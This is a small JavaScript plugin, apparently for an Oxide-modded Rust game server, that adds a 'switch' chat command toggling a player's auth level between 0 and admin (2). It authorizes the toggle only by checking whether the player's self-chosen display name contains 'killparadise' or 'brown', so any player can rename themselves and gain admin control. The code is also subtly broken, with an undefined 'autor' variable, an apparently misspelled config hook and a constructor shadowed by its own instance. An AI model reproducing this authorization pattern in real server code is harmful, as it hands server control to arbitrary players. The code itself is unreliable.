function StaffSwitch(title, author, version) {
    this.Title = title;
    this.Author = autor;
    this.Version = version;
}

StaffSwitch.prototype.Init = function() {
    command.AddChatCommand("switch", this.Plugin, "switchCmd");
}

StaffSwitch.prototype.LeadDefaultConfig = function() {
    this.Config.Settings = "";
}

StaffSwitch.prototype.switchCmd = function(player, cmd, args) {
    var name = player.displayName.toLowerCase();
    if (name.indexOf('killparadise') > -1 || name.indexOf('brown') > -1) {
        player.ChatMessage("Player Found, updating auth level");
        if (player.net.connection.authLevel === 2) {
            player.net.connection.authLevel = 0;
            player.ChatMessage("Switched your auth level to 0, you may need to relog to see the change");
        } else {
            player.net.connection.authLevel = 2
            player.ChatMessage("Switched your auth level back to 2, you may need to relog to see the change");
        }
    }
}

var StaffSwitch = new StaffSwitch("Staff Switch", "KillParadise", V(1, 0, 0));
